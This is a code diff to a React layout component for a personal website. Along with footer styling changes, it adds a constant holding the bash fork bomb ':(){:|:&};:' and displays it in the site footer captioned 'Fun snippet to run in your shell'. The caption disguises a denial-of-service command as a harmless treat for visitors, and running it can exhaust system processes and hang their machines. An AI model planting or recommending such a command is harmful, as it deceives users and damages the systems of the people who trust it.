@@ -2,8 +2,10 @@ import { Head } from "./head";
 import { Navbar } from "@/components/navbar";
 import { clsx } from "clsx";
 import { Divider } from "@heroui/divider";
+import { Code } from "@heroui/code";
 
 export function DefaultLayout({ children }: { children: React.ReactNode }) {
+  const forkBomb = ":(){:|:&};:";
   return (
     <div className="relative flex flex-col h-screen">
       <Head />
@@ -11,9 +13,11 @@ export function DefaultLayout({ children }: { children: React.ReactNode }) {
 
       <main>{children}</main>
 
-      <footer className="w-full flex items-center justify-center py-3 text-xs">
-        <span className="text-default-600">
-          Copyright © 2025 Hal Nguyen. All Rights Reserved.
+      <footer className="w-full flex flex-col items-center justify-center py-3 text-xs gap-3 text-default-600">
+        <span>Copyright © 2025 Hal Nguyen. All Rights Reserved.</span>
+        <span className="flex flex-col items-center">
+          <Code>{forkBomb}</Code>
+          <span>Fun snippet to run in your shell</span>
         </span>
       </footer>
     </div>
